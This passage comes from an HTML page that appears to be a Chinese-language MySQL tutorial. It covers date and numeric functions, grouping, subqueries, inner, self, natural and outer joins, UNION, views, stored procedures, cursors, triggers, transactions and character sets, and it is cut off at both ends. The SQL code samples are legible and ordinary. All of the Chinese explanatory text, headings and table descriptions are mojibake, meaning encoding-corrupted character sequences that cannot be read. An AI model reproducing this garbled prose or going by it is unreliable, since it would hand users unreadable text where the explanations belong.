<td style="text-align:center">è¿”å›ä¸€ä¸ªæ ¼å¼åŒ–çš„æ—¥æœŸæˆ–æ—¶é—´ä¸²</td>
</tr>
<tr>
<td style="text-align:center">DAY()</td>
<td style="text-align:center">è¿”å›ä¸€ä¸ªæ—¥æœŸçš„å¤©æ•°éƒ¨åˆ†</td>
</tr>
<tr>
<td style="text-align:center">DAYOFWEEK()</td>
<td style="text-align:center">å¯¹äºä¸€ä¸ªæ—¥æœŸï¼Œè¿”å›å¯¹åº”çš„æ˜ŸæœŸå‡ </td>
</tr>
<tr>
<td style="text-align:center">HOUR()</td>
<td style="text-align:center">è¿”å›ä¸€ä¸ªæ—¶é—´çš„å°æ—¶éƒ¨åˆ†</td>
</tr>
<tr>
<td style="text-align:center">MINUTE()</td>
<td style="text-align:center">è¿”å›ä¸€ä¸ªæ—¶é—´çš„åˆ†é’Ÿéƒ¨åˆ†</td>
</tr>
<tr>
<td style="text-align:center">MONTH()</td>
<td style="text-align:center">è¿”å›ä¸€ä¸ªæ—¥æœŸçš„æœˆä»½éƒ¨åˆ†</td>
</tr>
<tr>
<td style="text-align:center">NOW()</td>
<td style="text-align:center">è¿”å›å½“å‰æ—¥æœŸå’Œæ—¶é—´</td>
</tr>
<tr>
<td style="text-align:center">SECOND()</td>
<td style="text-align:center">è¿”å›ä¸€ä¸ªæ—¶é—´çš„ç§’éƒ¨åˆ†</td>
</tr>
<tr>
<td style="text-align:center">TIME()</td>
<td style="text-align:center">è¿”å›ä¸€ä¸ªæ—¥æœŸæ—¶é—´çš„æ—¶é—´éƒ¨åˆ†</td>
</tr>
<tr>
<td style="text-align:center">YEAR()</td>
<td style="text-align:center">è¿”å›ä¸€ä¸ªæ—¥æœŸçš„å¹´ä»½éƒ¨åˆ†</td>
</tr>
</tbody>
</table>
<div><pre><code>mysql<span>></span> <span>SELECT</span> <span>NOW</span><span>(</span><span>)</span><span>;</span>
</code></pre></div><div><pre><code>2018-4-14 20:25:11
</code></pre></div><h2 id="æ•°å€¼å¤„ç†" tabindex="-1"> æ•°å€¼å¤„ç†</h2>
<table>
<thead>
<tr>
<th style="text-align:center">å‡½æ•°</th>
<th style="text-align:center">è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">SIN()</td>
<td style="text-align:center">æ­£å¼¦</td>
</tr>
<tr>
<td style="text-align:center">COS()</td>
<td style="text-align:center">ä½™å¼¦</td>
</tr>
<tr>
<td style="text-align:center">TAN()</td>
<td style="text-align:center">æ­£åˆ‡</td>
</tr>
<tr>
<td style="text-align:center">ABS()</td>
<td style="text-align:center">ç»å¯¹å€¼</td>
</tr>
<tr>
<td style="text-align:center">SQRT()</td>
<td style="text-align:center">å¹³æ–¹æ ¹</td>
</tr>
<tr>
<td style="text-align:center">MOD()</td>
<td style="text-align:center">ä½™æ•°</td>
</tr>
<tr>
<td style="text-align:center">EXP()</td>
<td style="text-align:center">æŒ‡æ•°</td>
</tr>
<tr>
<td style="text-align:center">PI()</td>
<td style="text-align:center">åœ†å‘¨ç‡</td>
</tr>
<tr>
<td style="text-align:center">RAND()</td>
<td style="text-align:center">éšæœºæ•°</td>
</tr>
</tbody>
</table>
<h1 id="åä¸‰ã€åˆ†ç»„" tabindex="-1"> åä¸‰ã€åˆ†ç»„</h1>
<p>æŠŠå…·æœ‰ç›¸åŒçš„æ•°æ®å€¼çš„è¡Œæ”¾åœ¨åŒä¸€ç»„ä¸­ã€‚</p>
<p>å¯ä»¥å¯¹åŒä¸€åˆ†ç»„æ•°æ®ä½¿ç”¨æ±‡æ€»å‡½æ•°è¿›è¡Œå¤„ç†ï¼Œä¾‹å¦‚æ±‚åˆ†ç»„æ•°æ®çš„å¹³å‡å€¼ç­‰ã€‚</p>
<p>æŒ‡å®šçš„åˆ†ç»„å­—æ®µé™¤äº†èƒ½æŒ‰è¯¥å­—æ®µè¿›è¡Œåˆ†ç»„ï¼Œä¹Ÿä¼šè‡ªåŠ¨æŒ‰è¯¥å­—æ®µè¿›è¡Œæ’åºã€‚</p>
<div><pre><code><span>SELECT</span> col<span>,</span> <span>COUNT</span><span>(</span><span>*</span><span>)</span> <span>AS</span> num
<span>FROM</span> mytable
<span>GROUP</span> <span>BY</span> col<span>;</span>
</code></pre></div><p>GROUP BY è‡ªåŠ¨æŒ‰åˆ†ç»„å­—æ®µè¿›è¡Œæ’åºï¼ŒORDER BY ä¹Ÿå¯ä»¥æŒ‰æ±‡æ€»å­—æ®µæ¥è¿›è¡Œæ’åºã€‚</p>
<div><pre><code><span>SELECT</span> col<span>,</span> <span>COUNT</span><span>(</span><span>*</span><span>)</span> <span>AS</span> num
<span>FROM</span> mytable
<span>GROUP</span> <span>BY</span> col
<span>ORDER</span> <span>BY</span> num<span>;</span>
</code></pre></div><p>WHERE è¿‡æ»¤è¡Œï¼ŒHAVING è¿‡æ»¤åˆ†ç»„ï¼Œè¡Œè¿‡æ»¤åº”å½“å…ˆäºåˆ†ç»„è¿‡æ»¤ã€‚</p>
<div><pre><code><span>SELECT</span> col<span>,</span> <span>COUNT</span><span>(</span><span>*</span><span>)</span> <span>AS</span> num
<span>FROM</span> mytable
<span>WHERE</span> col <span>></span> <span>2</span>
<span>GROUP</span> <span>BY</span> col
<span>HAVING</span> num <span>>=</span> <span>2</span><span>;</span>
</code></pre></div><p>åˆ†ç»„è§„å®šï¼š</p>
<ul>
<li>GROUP BY å­å¥å‡ºç°åœ¨ WHERE å­å¥ä¹‹åï¼ŒORDER BY å­å¥ä¹‹å‰ï¼›</li>
<li>é™¤äº†æ±‡æ€»å­—æ®µå¤–ï¼ŒSELECT è¯­å¥ä¸­çš„æ¯ä¸€å­—æ®µéƒ½å¿…é¡»åœ¨ GROUP BY å­å¥ä¸­ç»™å‡ºï¼›</li>
<li>NULL çš„è¡Œä¼šå•ç‹¬åˆ†ä¸ºä¸€ç»„ï¼›</li>
<li>å¤§å¤šæ•° SQL å®ç°ä¸æ”¯æŒ GROUP BY åˆ—å…·æœ‰å¯å˜é•¿åº¦çš„æ•°æ®ç±»å‹ã€‚</li>
</ul>
<h1 id="åå››ã€å­æŸ¥è¯¢" tabindex="-1"> åå››ã€å­æŸ¥è¯¢</h1>
<p>å­æŸ¥è¯¢ä¸­åªèƒ½è¿”å›ä¸€ä¸ªå­—æ®µçš„æ•°æ®ã€‚</p>
<p>å¯ä»¥å°†å­æŸ¥è¯¢çš„ç»“æœä½œä¸º WHRER è¯­å¥çš„è¿‡æ»¤æ¡ä»¶ï¼š</p>
<div><pre><code><span>SELECT</span> <span>*</span>
<span>FROM</span> mytable1
<span>WHERE</span> col1 <span>IN</span> <span>(</span><span>SELECT</span> col2
               <span>FROM</span> mytable2<span>)</span><span>;</span>
</code></pre></div><p>ä¸‹é¢çš„è¯­å¥å¯ä»¥æ£€ç´¢å‡ºå®¢æˆ·çš„è®¢å•æ•°é‡ï¼Œå­æŸ¥è¯¢è¯­å¥ä¼šå¯¹ç¬¬ä¸€ä¸ªæŸ¥è¯¢æ£€ç´¢å‡ºçš„æ¯ä¸ªå®¢æˆ·æ‰§è¡Œä¸€æ¬¡ï¼š</p>
<div><pre><code><span>SELECT</span> cust_name<span>,</span> <span>(</span><span>SELECT</span> <span>COUNT</span><span>(</span><span>*</span><span>)</span>
                   <span>FROM</span> Orders
                   <span>WHERE</span> Orders<span>.</span>cust_id <span>=</span> Customers<span>.</span>cust_id<span>)</span>
                   <span>AS</span> orders_num
<span>FROM</span> Customers
<span>ORDER</span> <span>BY</span> cust_name<span>;</span>
</code></pre></div><h1 id="åäº”ã€è¿æ¥" tabindex="-1"> åäº”ã€è¿æ¥</h1>
<p>è¿æ¥ç”¨äºè¿æ¥å¤šä¸ªè¡¨ï¼Œä½¿ç”¨ JOIN å…³é”®å­—ï¼Œå¹¶ä¸”æ¡ä»¶è¯­å¥ä½¿ç”¨ ON è€Œä¸æ˜¯ WHEREã€‚</p>
<p>è¿æ¥å¯ä»¥æ›¿æ¢å­æŸ¥è¯¢ï¼Œå¹¶ä¸”æ¯”å­æŸ¥è¯¢çš„æ•ˆç‡ä¸€èˆ¬ä¼šæ›´å¿«ã€‚</p>
<p>å¯ä»¥ç”¨ AS ç»™åˆ—åã€è®¡ç®—å­—æ®µå’Œè¡¨åå–åˆ«åï¼Œç»™è¡¨åå–åˆ«åæ˜¯ä¸ºäº†ç®€åŒ– SQL è¯­å¥ä»¥åŠè¿æ¥ç›¸åŒè¡¨ã€‚</p>
<h2 id="å†…è¿æ¥" tabindex="-1"> å†…è¿æ¥</h2>
<p>å†…è¿æ¥åˆç§°ç­‰å€¼è¿æ¥ï¼Œä½¿ç”¨ INNER JOIN å…³é”®å­—ã€‚</p>
<div><pre><code><span>SELECT</span> A<span>.</span><span>value</span><span>,</span> B<span>.</span><span>value</span>
<span>FROM</span> tablea <span>AS</span> A <span>INNER</span> <span>JOIN</span> tableb <span>AS</span> B
<span>ON</span> A<span>.</span><span>key</span> <span>=</span> B<span>.</span><span>key</span><span>;</span>
</code></pre></div><p>å¯ä»¥ä¸æ˜ç¡®ä½¿ç”¨ INNER JOINï¼Œè€Œä½¿ç”¨æ™®é€šæŸ¥è¯¢å¹¶åœ¨ WHERE ä¸­å°†ä¸¤ä¸ªè¡¨ä¸­è¦è¿æ¥çš„åˆ—ç”¨ç­‰å€¼æ–¹æ³•è¿æ¥èµ·æ¥ã€‚</p>
<div><pre><code><span>SELECT</span> A<span>.</span><span>value</span><span>,</span> B<span>.</span><span>value</span>
<span>FROM</span> tablea <span>AS</span> A<span>,</span> tableb <span>AS</span> B
<span>WHERE</span> A<span>.</span><span>key</span> <span>=</span> B<span>.</span><span>key</span><span>;</span>
</code></pre></div><h2 id="è‡ªè¿æ¥" tabindex="-1"> è‡ªè¿æ¥</h2>
<p>è‡ªè¿æ¥å¯ä»¥çœ‹æˆå†…è¿æ¥çš„ä¸€ç§ï¼Œåªæ˜¯è¿æ¥çš„è¡¨æ˜¯è‡ªèº«è€Œå·²ã€‚</p>
<p>ä¸€å¼ å‘˜å·¥è¡¨ï¼ŒåŒ…å«å‘˜å·¥å§“åå’Œå‘˜å·¥æ‰€å±éƒ¨é—¨ï¼Œè¦æ‰¾å‡ºä¸ Jim å¤„åœ¨åŒä¸€éƒ¨é—¨çš„æ‰€æœ‰å‘˜å·¥å§“åã€‚</p>
<p>å­æŸ¥è¯¢ç‰ˆæœ¬</p>
<div><pre><code><span>SELECT</span> name
<span>FROM</span> employee
<span>WHERE</span> department <span>=</span> <span>(</span>
      <span>SELECT</span> department
      <span>FROM</span> employee
      <span>WHERE</span> name <span>=</span> <span>"Jim"</span><span>)</span><span>;</span>
</code></pre></div><p>è‡ªè¿æ¥ç‰ˆæœ¬</p>
<div><pre><code><span>SELECT</span> e1<span>.</span>name
<span>FROM</span> employee <span>AS</span> e1 <span>INNER</span> <span>JOIN</span> employee <span>AS</span> e2
<span>ON</span> e1<span>.</span>department <span>=</span> e2<span>.</span>department
      <span>AND</span> e2<span>.</span>name <span>=</span> <span>"Jim"</span><span>;</span>
</code></pre></div><h2 id="è‡ªç„¶è¿æ¥" tabindex="-1"> è‡ªç„¶è¿æ¥</h2>
<p>è‡ªç„¶è¿æ¥æ˜¯æŠŠåŒååˆ—é€šè¿‡ç­‰å€¼æµ‹è¯•è¿æ¥èµ·æ¥çš„ï¼ŒåŒååˆ—å¯ä»¥æœ‰å¤šä¸ªã€‚</p>
<p>å†…è¿æ¥å’Œè‡ªç„¶è¿æ¥çš„åŒºåˆ«ï¼šå†…è¿æ¥æä¾›è¿æ¥çš„åˆ—ï¼Œè€Œè‡ªç„¶è¿æ¥è‡ªåŠ¨è¿æ¥æ‰€æœ‰åŒååˆ—ã€‚</p>
<div><pre><code><span>SELECT</span> A<span>.</span><span>value</span><span>,</span> B<span>.</span><span>value</span>
<span>FROM</span> tablea <span>AS</span> A <span>NATURAL</span> <span>JOIN</span> tableb <span>AS</span> B<span>;</span>
</code></pre></div><h2 id="å¤–è¿æ¥" tabindex="-1"> å¤–è¿æ¥</h2>
<p>å¤–è¿æ¥ä¿ç•™äº†æ²¡æœ‰å…³è”çš„é‚£äº›è¡Œã€‚åˆ†ä¸ºå·¦å¤–è¿æ¥ï¼Œå³å¤–è¿æ¥ä»¥åŠå…¨å¤–è¿æ¥ï¼Œå·¦å¤–è¿æ¥å°±æ˜¯ä¿ç•™å·¦è¡¨æ²¡æœ‰å…³è”çš„è¡Œã€‚</p>
<p>æ£€ç´¢æ‰€æœ‰é¡¾å®¢çš„è®¢å•ä¿¡æ¯ï¼ŒåŒ…æ‹¬è¿˜æ²¡æœ‰è®¢å•ä¿¡æ¯çš„é¡¾å®¢ã€‚</p>
<div><pre><code><span>SELECT</span> Customers<span>.</span>cust_id<span>,</span> Orders<span>.</span>order_num
<span>FROM</span> Customers <span>LEFT</span> <span>OUTER</span> <span>JOIN</span> Orders
<span>ON</span> Customers<span>.</span>cust_id <span>=</span> Orders<span>.</span>cust_id<span>;</span>
</code></pre></div><p>customers è¡¨ï¼š</p>
<table>
<thead>
<tr>
<th style="text-align:center">cust_id</th>
<th style="text-align:center">cust_name</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">a</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">b</td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td style="text-align:center">c</td>
</tr>
</tbody>
</table>
<p>orders è¡¨ï¼š</p>
<table>
<thead>
<tr>
<th style="text-align:center">order_id</th>
<th style="text-align:center">cust_id</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">1</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">1</td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td style="text-align:center">3</td>
</tr>
<tr>
<td style="text-align:center">4</td>
<td style="text-align:center">3</td>
</tr>
</tbody>
</table>
<p>ç»“æœï¼š</p>
<table>
<thead>
<tr>
<th style="text-align:center">cust_id</th>
<th style="text-align:center">cust_name</th>
<th style="text-align:center">order_id</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">a</td>
<td style="text-align:center">1</td>
</tr>
<tr>
<td style="text-align:center">1</td>
<td style="text-align:center">a</td>
<td style="text-align:center">2</td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td style="text-align:center">c</td>
<td style="text-align:center">3</td>
</tr>
<tr>
<td style="text-align:center">3</td>
<td style="text-align:center">c</td>
<td style="text-align:center">4</td>
</tr>
<tr>
<td style="text-align:center">2</td>
<td style="text-align:center">b</td>
<td style="text-align:center">Null</td>
</tr>
</tbody>
</table>
<h1 id="åå…­ã€ç»„åˆæŸ¥è¯¢" tabindex="-1"> åå…­ã€ç»„åˆæŸ¥è¯¢</h1>
<p>ä½¿ç”¨  <strong>UNION</strong>  æ¥ç»„åˆä¸¤ä¸ªæŸ¥è¯¢ï¼Œå¦‚æœç¬¬ä¸€ä¸ªæŸ¥è¯¢è¿”å› M è¡Œï¼Œç¬¬äºŒä¸ªæŸ¥è¯¢è¿”å› N è¡Œï¼Œé‚£ä¹ˆç»„åˆæŸ¥è¯¢çš„ç»“æœä¸€èˆ¬ä¸º M+N è¡Œã€‚</p>
<p>æ¯ä¸ªæŸ¥è¯¢å¿…é¡»åŒ…å«ç›¸åŒçš„åˆ—ã€è¡¨è¾¾å¼å’Œèšé›†å‡½æ•°ã€‚</p>
<p>é»˜è®¤ä¼šå»é™¤ç›¸åŒè¡Œï¼Œå¦‚æœéœ€è¦ä¿ç•™ç›¸åŒè¡Œï¼Œä½¿ç”¨ UNION ALLã€‚</p>
<p>åªèƒ½åŒ…å«ä¸€ä¸ª ORDER BY å­å¥ï¼Œå¹¶ä¸”å¿…é¡»ä½äºè¯­å¥çš„æœ€åã€‚</p>
<div><pre><code><span>SELECT</span> col
<span>FROM</span> mytable
<span>WHERE</span> col <span>=</span> <span>1</span>
<span>UNION</span>
<span>SELECT</span> col
<span>FROM</span> mytable
<span>WHERE</span> col <span>=</span><span>2</span><span>;</span>
</code></pre></div><h1 id="åä¸ƒã€è§†å›¾" tabindex="-1"> åä¸ƒã€è§†å›¾</h1>
<p>è§†å›¾æ˜¯è™šæ‹Ÿçš„è¡¨ï¼Œæœ¬èº«ä¸åŒ…å«æ•°æ®ï¼Œä¹Ÿå°±ä¸èƒ½å¯¹å…¶è¿›è¡Œç´¢å¼•æ“ä½œã€‚</p>
<p>å¯¹è§†å›¾çš„æ“ä½œå’Œå¯¹æ™®é€šè¡¨çš„æ“ä½œä¸€æ ·ã€‚</p>
<p>è§†å›¾å…·æœ‰å¦‚ä¸‹å¥½å¤„ï¼š</p>
<ul>
<li>ç®€åŒ–å¤æ‚çš„ SQL æ“ä½œï¼Œæ¯”å¦‚å¤æ‚çš„è¿æ¥ï¼›</li>
<li>åªä½¿ç”¨å®é™…è¡¨çš„ä¸€éƒ¨åˆ†æ•°æ®ï¼›</li>
<li>é€šè¿‡åªç»™ç”¨æˆ·è®¿é—®è§†å›¾çš„æƒé™ï¼Œä¿è¯æ•°æ®çš„å®‰å…¨æ€§ï¼›</li>
<li>æ›´æ”¹æ•°æ®æ ¼å¼å’Œè¡¨ç¤ºã€‚</li>
</ul>
<div><pre><code><span>CREATE</span> <span>VIEW</span> myview <span>AS</span>
<span>SELECT</span> Concat<span>(</span>col1<span>,</span> col2<span>)</span> <span>AS</span> concat_col<span>,</span> col3<span>*</span>col4 <span>AS</span> compute_col
<span>FROM</span> mytable
<span>WHERE</span> col5 <span>=</span> val<span>;</span>
</code></pre></div><h1 id="åå…«ã€å­˜å‚¨è¿‡ç¨‹" tabindex="-1"> åå…«ã€å­˜å‚¨è¿‡ç¨‹</h1>
<p>å­˜å‚¨è¿‡ç¨‹å¯ä»¥çœ‹æˆæ˜¯å¯¹ä¸€ç³»åˆ— SQL æ“ä½œçš„æ‰¹å¤„ç†ã€‚</p>
<p>ä½¿ç”¨å­˜å‚¨è¿‡ç¨‹çš„å¥½å¤„ï¼š</p>
<ul>
<li>ä»£ç å°è£…ï¼Œä¿è¯äº†ä¸€å®šçš„å®‰å…¨æ€§ï¼›</li>
<li>ä»£ç å¤ç”¨ï¼›</li>
<li>ç”±äºæ˜¯é¢„å…ˆç¼–è¯‘ï¼Œå› æ­¤å…·æœ‰å¾ˆé«˜çš„æ€§èƒ½ã€‚</li>
</ul>
<p>å‘½ä»¤è¡Œä¸­åˆ›å»ºå­˜å‚¨è¿‡ç¨‹éœ€è¦è‡ªå®šä¹‰åˆ†éš”ç¬¦ï¼Œå› ä¸ºå‘½ä»¤è¡Œæ˜¯ä»¥ ; ä¸ºç»“æŸç¬¦ï¼Œè€Œå­˜å‚¨è¿‡ç¨‹ä¸­ä¹ŸåŒ…å«äº†åˆ†å·ï¼Œå› æ­¤ä¼šé”™è¯¯æŠŠè¿™éƒ¨åˆ†åˆ†å·å½“æˆæ˜¯ç»“æŸç¬¦ï¼Œé€ æˆè¯­æ³•é”™è¯¯ã€‚</p>
<p>åŒ…å« inã€out å’Œ inout ä¸‰ç§å‚æ•°ã€‚</p>
<p>ç»™å˜é‡èµ‹å€¼éƒ½éœ€è¦ç”¨ select into è¯­å¥ã€‚</p>
<p>æ¯æ¬¡åªèƒ½ç»™ä¸€ä¸ªå˜é‡èµ‹å€¼ï¼Œä¸æ”¯æŒé›†åˆçš„æ“ä½œã€‚</p>
<div><pre><code><span>delimiter</span> <span>//</span>

<span>create</span> <span>procedure</span> myprocedure<span>(</span> <span>out</span> ret <span>int</span> <span>)</span>
    <span>begin</span>
        <span>declare</span> y <span>int</span><span>;</span>
        <span>select</span> <span>sum</span><span>(</span>col1<span>)</span>
        <span>from</span> mytable
        <span>into</span> y<span>;</span>
        <span>select</span> y<span>*</span>y <span>into</span> ret<span>;</span>
    <span>end</span> <span>//</span>

<span>delimiter</span> <span>;</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div><div><pre><code><span>call</span> myprocedure<span>(</span><span>@ret</span><span>)</span><span>;</span>
<span>select</span> <span>@ret</span><span>;</span>
</code></pre></div><h1 id="åä¹ã€æ¸¸æ ‡" tabindex="-1"> åä¹ã€æ¸¸æ ‡</h1>
<p>åœ¨å­˜å‚¨è¿‡ç¨‹ä¸­ä½¿ç”¨æ¸¸æ ‡å¯ä»¥å¯¹ä¸€ä¸ªç»“æœé›†è¿›è¡Œç§»åŠ¨éå†ã€‚</p>
<p>æ¸¸æ ‡ä¸»è¦ç”¨äºäº¤äº’å¼åº”ç”¨ï¼Œå…¶ä¸­ç”¨æˆ·éœ€è¦å¯¹æ•°æ®é›†ä¸­çš„ä»»æ„è¡Œè¿›è¡Œæµè§ˆå’Œä¿®æ”¹ã€‚</p>
<p>ä½¿ç”¨æ¸¸æ ‡çš„å››ä¸ªæ­¥éª¤ï¼š</p>
<ol>
<li>å£°æ˜æ¸¸æ ‡ï¼Œè¿™ä¸ªè¿‡ç¨‹æ²¡æœ‰å®é™…æ£€ç´¢å‡ºæ•°æ®ï¼›</li>
<li>æ‰“å¼€æ¸¸æ ‡ï¼›</li>
<li>å–å‡ºæ•°æ®ï¼›</li>
<li>å…³é—­æ¸¸æ ‡ï¼›</li>
</ol>
<div><pre><code><span>delimiter</span> <span>//</span>
<span>create</span> <span>procedure</span> myprocedure<span>(</span><span>out</span> ret <span>int</span><span>)</span>
    <span>begin</span>
        <span>declare</span> done <span>boolean</span> <span>default</span> <span>0</span><span>;</span>

        <span>declare</span> mycursor <span>cursor</span> <span>for</span>
        <span>select</span> col1 <span>from</span> mytable<span>;</span>
        <span># å®šä¹‰äº†ä¸€ä¸ª continue handlerï¼Œå½“ sqlstate '02000' è¿™ä¸ªæ¡ä»¶å‡ºç°æ—¶ï¼Œä¼šæ‰§è¡Œ set done = 1</span>
        <span>declare</span> <span>continue</span> <span>handler</span> <span>for</span> sqlstate <span>'02000'</span> <span>set</span> done <span>=</span> <span>1</span><span>;</span>

        <span>open</span> mycursor<span>;</span>

        <span>repeat</span>
            <span>fetch</span> mycursor <span>into</span> ret<span>;</span>
            <span>select</span> ret<span>;</span>
        until done <span>end</span> <span>repeat</span><span>;</span>

        <span>close</span> mycursor<span>;</span>
    <span>end</span> <span>//</span>
 <span>delimiter</span> <span>;</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br></div></div><h1 id="äºŒåã€è§¦å‘å™¨" tabindex="-1"> äºŒåã€è§¦å‘å™¨</h1>
<p>è§¦å‘å™¨ä¼šåœ¨æŸä¸ªè¡¨æ‰§è¡Œä»¥ä¸‹è¯­å¥æ—¶è€Œè‡ªåŠ¨æ‰§è¡Œï¼šDELETEã€INSERTã€UPDATEã€‚</p>
<p>è§¦å‘å™¨å¿…é¡»æŒ‡å®šåœ¨è¯­å¥æ‰§è¡Œä¹‹å‰è¿˜æ˜¯ä¹‹åè‡ªåŠ¨æ‰§è¡Œï¼Œä¹‹å‰æ‰§è¡Œä½¿ç”¨ BEFORE å…³é”®å­—ï¼Œä¹‹åæ‰§è¡Œä½¿ç”¨ AFTER å…³é”®å­—ã€‚BEFORE ç”¨äºæ•°æ®éªŒè¯å’Œå‡€åŒ–ï¼ŒAFTER ç”¨äºå®¡è®¡è·Ÿè¸ªï¼Œå°†ä¿®æ”¹è®°å½•åˆ°å¦å¤–ä¸€å¼ è¡¨ä¸­ã€‚</p>
<p>INSERT è§¦å‘å™¨åŒ…å«ä¸€ä¸ªåä¸º NEW çš„è™šæ‹Ÿè¡¨ã€‚</p>
<div><pre><code><span>CREATE</span> <span>TRIGGER</span> mytrigger <span>AFTER</span> <span>INSERT</span> <span>ON</span> mytable
<span>FOR EACH ROW</span> <span>SELECT</span> NEW<span>.</span>col <span>into</span> <span>@result</span><span>;</span>

<span>SELECT</span> <span>@result</span><span>;</span> <span>-- è·å–ç»“æœ</span>
</code></pre></div><p>DELETE è§¦å‘å™¨åŒ…å«ä¸€ä¸ªåä¸º OLD çš„è™šæ‹Ÿè¡¨ï¼Œå¹¶ä¸”æ˜¯åªè¯»çš„ã€‚</p>
<p>UPDATE è§¦å‘å™¨åŒ…å«ä¸€ä¸ªåä¸º NEW å’Œä¸€ä¸ªåä¸º OLD çš„è™šæ‹Ÿè¡¨ï¼Œå…¶ä¸­ NEW æ˜¯å¯ä»¥è¢«ä¿®æ”¹çš„ï¼Œè€Œ OLD æ˜¯åªè¯»çš„ã€‚</p>
<p>MySQL ä¸å…è®¸åœ¨è§¦å‘å™¨ä¸­ä½¿ç”¨ CALL è¯­å¥ï¼Œä¹Ÿå°±æ˜¯ä¸èƒ½è°ƒç”¨å­˜å‚¨è¿‡ç¨‹ã€‚</p>
<h1 id="äºŒåä¸€ã€äº‹åŠ¡ç®¡ç†" tabindex="-1"> äºŒåä¸€ã€äº‹åŠ¡ç®¡ç†</h1>
<p>åŸºæœ¬æœ¯è¯­ï¼š</p>
<ul>
<li>äº‹åŠ¡ï¼ˆtransactionï¼‰æŒ‡ä¸€ç»„ SQL è¯­å¥ï¼›</li>
<li>å›é€€ï¼ˆrollbackï¼‰æŒ‡æ’¤é”€æŒ‡å®š SQL è¯­å¥çš„è¿‡ç¨‹ï¼›</li>
<li>æäº¤ï¼ˆcommitï¼‰æŒ‡å°†æœªå­˜å‚¨çš„ SQL è¯­å¥ç»“æœå†™å…¥æ•°æ®åº“è¡¨ï¼›</li>
<li>ä¿ç•™ç‚¹ï¼ˆsavepointï¼‰æŒ‡äº‹åŠ¡å¤„ç†ä¸­è®¾ç½®çš„ä¸´æ—¶å ä½ç¬¦ï¼ˆplaceholderï¼‰ï¼Œä½ å¯ä»¥å¯¹å®ƒå‘å¸ƒå›é€€ï¼ˆä¸å›é€€æ•´ä¸ªäº‹åŠ¡å¤„ç†ä¸åŒï¼‰ã€‚</li>
</ul>
<p>ä¸èƒ½å›é€€ SELECT è¯­å¥ï¼Œå›é€€ SELECT è¯­å¥ä¹Ÿæ²¡æ„ä¹‰ï¼›ä¹Ÿä¸èƒ½å›é€€ CREATE å’Œ DROP è¯­å¥ã€‚</p>
<p>MySQL çš„äº‹åŠ¡æäº¤é»˜è®¤æ˜¯éšå¼æäº¤ï¼Œæ¯æ‰§è¡Œä¸€æ¡è¯­å¥å°±æŠŠè¿™æ¡è¯­å¥å½“æˆä¸€ä¸ªäº‹åŠ¡ç„¶åè¿›è¡Œæäº¤ã€‚å½“å‡ºç° START TRANSACTION è¯­å¥æ—¶ï¼Œä¼šå…³é—­éšå¼æäº¤ï¼›å½“ COMMIT æˆ– ROLLBACK è¯­å¥æ‰§è¡Œåï¼Œäº‹åŠ¡ä¼šè‡ªåŠ¨å…³é—­ï¼Œé‡æ–°æ¢å¤éšå¼æäº¤ã€‚</p>
<p>è®¾ç½® autocommit ä¸º 0 å¯ä»¥å–æ¶ˆè‡ªåŠ¨æäº¤ï¼›autocommit æ ‡è®°æ˜¯é’ˆå¯¹æ¯ä¸ªè¿æ¥è€Œä¸æ˜¯é’ˆå¯¹æœåŠ¡å™¨çš„ã€‚</p>
<p>å¦‚æœæ²¡æœ‰è®¾ç½®ä¿ç•™ç‚¹ï¼ŒROLLBACK ä¼šå›é€€åˆ° START TRANSACTION è¯­å¥å¤„ï¼›å¦‚æœè®¾ç½®äº†ä¿ç•™ç‚¹ï¼Œå¹¶ä¸”åœ¨ ROLLBACK ä¸­æŒ‡å®šè¯¥ä¿ç•™ç‚¹ï¼Œåˆ™ä¼šå›é€€åˆ°è¯¥ä¿ç•™ç‚¹ã€‚</p>
<div><pre><code><span>START</span> <span>TRANSACTION</span>
<span>// ...</span>
<span>SAVEPOINT</span> delete1
<span>// ...</span>
<span>ROLLBACK</span> <span>TO</span> delete1
<span>// ...</span>
<span>COMMIT</span>
</code></pre></div><h1 id="äºŒåäºŒã€å­—ç¬¦é›†" tabindex="-1"> äºŒåäºŒã€å­—ç¬¦é›†</h1>
<p>åŸºæœ¬æœ¯è¯­ï¼š</p>
<ul>
<li>å­—ç¬¦é›†ä¸ºå­—æ¯å’Œç¬¦å·çš„é›†åˆï¼›</li>
<li>ç¼–ç ä¸ºæŸä¸ªå­—ç¬¦é›†æˆå‘˜çš„å†…éƒ¨è¡¨ç¤ºï¼›</li>
<li>æ ¡å¯¹å­—ç¬¦æŒ‡å®šå¦‚ä½•æ¯”è¾ƒï¼Œä¸»è¦ç”¨äºæ’åºå’Œåˆ†ç»„ã€‚</li>
</ul>
<p>é™¤äº†ç»™è¡¨æŒ‡å®šå­—ç¬¦é›†å’Œæ ¡å¯¹å¤–ï¼Œä¹Ÿå¯ä»¥ç»™åˆ—æŒ‡å®šï¼š</p>
<div><pre><code><span>CREATE</span> <span>TABLE</span> mytable
<span>(</span>col <span>VARCHAR</span><span>(</span><span>10</span><span>)</span> <span>CHARACTER</span> <span>SET</span> latin <span>COLLATE</span> latin1_general_ci <span>)</span>
<span>DEFAULT</span> <span>CHARACTER</span> <span>SET</span> hebrew <span>COLLATE</span> hebrew_general_ci<span>;</span>
</code></pre></div><p>å¯ä»¥åœ¨æ’åºã€åˆ†ç»„æ—¶æŒ‡å®šæ ¡å¯¹ï¼š</p>
<div><pre><code><span>SELECT</span> <span>*</span>
<span>FROM</span> mytable
